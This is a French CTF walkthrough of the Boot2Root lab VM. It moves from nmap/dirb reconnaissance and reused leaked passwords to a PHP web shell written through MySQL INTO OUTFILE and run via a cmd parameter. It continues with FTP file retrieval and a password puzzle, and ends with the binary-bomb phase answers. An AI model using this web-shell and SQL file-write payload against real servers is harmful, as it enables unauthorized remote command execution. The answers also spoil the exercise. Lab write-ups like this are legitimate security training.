Partie 1 :
    Etape 1 - Scanner avec nmap : 
        Scanner l'adresse ip local avec nmap. 
    Etape 2 - dirb :
        Ensuite scanner avec dirb pour trouver tout les chemins accessible du site
    Etape 3 - forum :
        Apres avoir trouver tout les chemis accesible il y a un chemin plusieurs chemin disponible /forum, /phpmyadmin, /webmail pour l'interessant
        seul /forum semble interessant car les deux autres demande des information de connexion.
        Sur ce forum on trouve differents post seul celui de "lmezard" retiens notre attention car il contient toute ses tentative de connection ssh.
        Dans une ligne il semble confondre son login et son mdp donc le mdp est visible et nous pouvons le tester pour essayer de ce connecter a son compte.
    Etape 4 - connection au compte
        En utilisant le nom d'utilisateur(lmezard) et le mots de passe(!q\]Ej?*5K5cy*AJ) trouver dans ces log partager on arrive a ce connecter au compte.
    Etape 5 - tester le mots de passe ailleurs
        En teste le mots de passe pour essayer de ce connecter en ssh,phpmyadmin,webmail mais cela ne fonctionne pas.
Partie 2:
    Etape 1 - Connection au webmail
        Apres avoir essayer de ce connecter sur webmail avec le login "lmezard" on parcours les information de compte de lmezard et on utilise son mail(laurie@borntosec.net)
        et le mdp(!q\]Ej?*5K5cy*AJ) qu'on a recuperer precedement et on arrive a ce connecter.
    Etape 2 - Consultation des mails
        On a deux mail dans la boite de reception dans l'un d'entre elle ce trouve un message indiquant les identifiant pour ce connecter a la base de donner
    Etape 3 - Connection a la base de donner
        On ce connecte a la base de donner avec le login(root) et le mdp(Fg-'kKXBj87E:aJ$) recupere dans la boite mail.
Partie 3:
    Etape 1 - Exploiter la db
        On accee a toute la base de donner avec toute les privilege.
    Etape 2 - upload un fichier php
        Lorsqu'on avait fait la commande dirb , on eu plusieurs dossier qui etait accessible et ou potentiellement on pouvais upload un
        un fichier qu'on pourrais executer.
        Sortie de la commande dirb : 
                    ---- Entering directory: https://192.168.56.104/forum/images/ ----
        (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
            (Use mode '-w' if you want to scan it anyway)
                                                                                    
        ---- Entering directory: https://192.168.56.104/forum/includes/ ----
        (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
            (Use mode '-w' if you want to scan it anyway)
                                                                                    
        ---- Entering directory: https://192.168.56.104/forum/js/ ----
        (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
            (Use mode '-w' if you want to scan it anyway)
                                                                                    
        ---- Entering directory: https://192.168.56.104/forum/lang/ ----
        (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
            (Use mode '-w' if you want to scan it anyway)
                                                                                    
        ---- Entering directory: https://192.168.56.104/forum/modules/ ----
        (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
            (Use mode '-w' if you want to scan it anyway)
                                                                                    
        ---- Entering directory: https://192.168.56.104/forum/templates_c/ ----
        (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
            (Use mode '-w' if you want to scan it anyway)
                                                                                    
        ---- Entering directory: https://192.168.56.104/forum/themes/ ----
        (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
            (Use mode '-w' if you want to scan it anyway)
                                                                                    
        ---- Entering directory: https://192.168.56.104/forum/update/ ----
        (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
            (Use mode '-w' if you want to scan it anyway)
    Etape 3 - Verification 
        On verifie ces chemin avec cette commande `SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/forum/[chemins]/test.php'`.
        On vois que la commande fonctionne que sur le chemin /forum/templates_c/.
    Etape 4 - upload le script php 
        A partir de cette etape on decide d'upload sur ce chemin notre script php qui nous permettra d'executer des commande sur le serveur distant.
        pour cela on remplace "<?php phpinfo(); ?>" par "<?php system($_GET['cmd']) ?>" et [chemins] par le bon chemin.
        Commande : SELECT "<?php system($_GET['cmd']) ?>" into outfile "/var/www/forum/templates_c/test.php"
    Etape 5 - acceder au fichier 
        On accede au fichier qu'on a uploader sur ce chemin : https://192.168.56.104/forum/templates_c/test.php 
        On ajoute l'argument avec la commande a executer : https://192.168.56.104/forum/templates_c/test.php?cmd=ls
        
        Ensuite nous avons le resultat suivant dans notre navigateur : 
        
        11c603a9070a9e1cbb42569c40699569e0a53f12.file.admin.inc.tpl.php 
        2bd398249eb3f005dbae14690a7dd67b920a4385.file.login.inc.tpl.php 
        40bf370f621e4a21516f806a52da816d70d613db.file.user.inc.tpl.php 
        427dca884025438fd528481570ed37a00b14939c.file.ajax_preview.tpl.php 
        560a32decccbae1a5f4aeb1b9de5bef4b3f2a9e5.file.posting.inc.tpl.php 
        5cfe6060cd61c240ab9571e3dbb89827c6893eea.file.main.tpl.php 
        749c74399509c1017fd789614be8fc686bbfc981.file.user_edit.inc.tpl.php 
        8e2360743d8fd2dec4d073e8a0541dbe322a9482.english.lang.config.php 
        ad5c544b74f3fd21e6cf286e36ee1b2d24a746b9.file.user_profile.inc.tpl.php 
        b2b306105b3842dc920a1d11c8bb367b28290c2a.file.subnavigation_1.inc.tpl.php 
        d0af1f95d9c68edf1f8805f6009e021a113a569a.file.entry.inc.tpl.php 
        e9c93976b632dda2b9bf7d2a686f72654e73a241.file.user_edit_email.inc.tpl.php 
        f13dc3b8bcb4f22c2bd24171219c43f5555f95c0.file.index.inc.tpl.php 
        f75851d3a324a67471c104f30409f32a790c330e.file.subnavigation_2.inc.tpl.php 
        test.php

    Etape 6 - Fouiller dans les dossiers
        Apres avoir fouiller dans les fichier. Dans le dossier /home on tombe sur le dossier LOOKATME on trouve le fichier password. 
        on fait la commande cat dessus et on tombe sur les info suivante lmezard:G!@M6f4Eatau{sF" 
    Etape 7 - teste le mdp
        On teste ces identifiant sur le ssh ca ne fonctionne pas. 
        On teste apres sur ftp et cela semble fonctionner. 
    Etape 8 - Exporter les fichier via ftp.
        On ce connect en ftp au serveur via un terminal.
        depuis la connexion ftp on accee qu'a a un seul dossier dans laquelle ce trouve deux fichier
        
        -rwxr-x---    1 1001     1001           96 Oct 15  2015 README
        -rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun

        On copie c'est deux fichier dans notre machine local avec la command 'get'.
    Etape 9 - Analyse du fichier.
        Le README contient la phrase suivante : Complete this little challenge and use the result as password for user 'laurie' to login in ssh
        Ce qui veut dire qu'on le fichier fun contient mots de passe. 
        Quand on ouvre le fichier fun , il semble contenir une immense quantiter de texte incomprehensible parmis cela on trouve ceci qui ressemble a un programe c:
        
        int main() {
            printf("M");
            printf("Y");
            printf(" ");
            printf("P");
            printf("A");
            printf("S");
            printf("S");
            printf("W");
            printf("O");
            printf("R");
            printf("D");
            printf(" ");
            printf("I");
            printf("S");
            printf(":");
            printf(" ");
            printf("%c",getme1());
            printf("%c",getme2());
            printf("%c",getme3());
            printf("%c",getme4());
            printf("%c",getme5());
            printf("%c",getme6());
            printf("%c",getme7());
            printf("%c",getme8()); w
            printf("%c",getme9()); n
            printf("%c",getme10()); a
            printf("%c",getme11()); g
            printf("%c",getme12()); e
            printf("\n");
	    printf("Now SHA-256 it and submit");
    }

    On Analysons encore le fichier on trouve les valeurs de retour de certain getme :
        
        char getme8() {
            return 'w';
        }

        }*/
        char getme9() {
            return 'n';
        }
        /*

        }*/
        char getme10() {
            return 'a';
        }
        /*

        }*/
        char getme11() {
            return 'g';
        }
        /*

        */
        char getme12()
        {
            return 'e';
        }
        /*
    
    Mais il nous manque toujours les getme1 a getme7, je les retrouve dans le fichier mais leur valeur de retour n'est pas visible.
    Par contre on vois que dans chaque fichier il y a un commentaire avec le numero de ce dernier : //file1
    Donc il faut extraire le contenu de chaque fichier et recupere le contenu dans l'ordre croissant et on pourrait avoir le resultat

    Apres avoir recuperer tous le code du program c On trouve les valeurs de retour et on arrive a notre mots de passe: Iheartpwnage

    Ensuite on fait un sha256sum sur le mdp : echo -n "Iheartpwnage" | sha256sum
        330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
    Avec ce mots de passe et le login laurie on arrive a ce connecter en ssh

Partie 4 :
    Etape 1 - Reperage
        Il y a deux fichier sur la session de laurie README et bombe 
        voici le contenu de README :
            When you have all the password use it as "thor" user with ssh.

            HINT:
            P
            2
            b

            o
            4

        phase 1 : 
            Public speaking is very easy.
        phase 2 :
            1 2 6 24 120 720

            Pour éviter que explode_bomb soit appelée, les six nombres doivent suivre ces règles :
            Le premier nombre (aiStack_20[1]) doit être 1.
            Chaque nombre suivant doit être le produit de son indice (commençant à 2) et du nombre précédent.
            Décrivons ces valeurs pas à pas :

            aiStack_20[1] = 1
            aiStack_20[2] = 2 * aiStack_20[1] = 2 * 1 = 2
            aiStack_20[3] = 3 * aiStack_20[2] = 3 * 2 = 6
            aiStack_20[4] = 4 * aiStack_20[3] = 4 * 6 = 24
            aiStack_20[5] = 5 * aiStack_20[4] = 5 * 24 = 120
            aiStack_20[6] = 6 * aiStack_20[5] = 6 * 120 = 720
            
            Donc, la séquence de valeurs correcte pour param_1 doit être : 1 2 6 24 120 720.
        phase 3 :
            0 q 777
            2 b 755
            1 b 214 
        phase 4 : 
            9 (fibonnaci)
        phase 5 :
            opekmq
        phase 6 :
            4 2 6 3 1 5

        Le mots de passe complet : Publicspeakingisveryeasy.126241207201b2149opekmq426135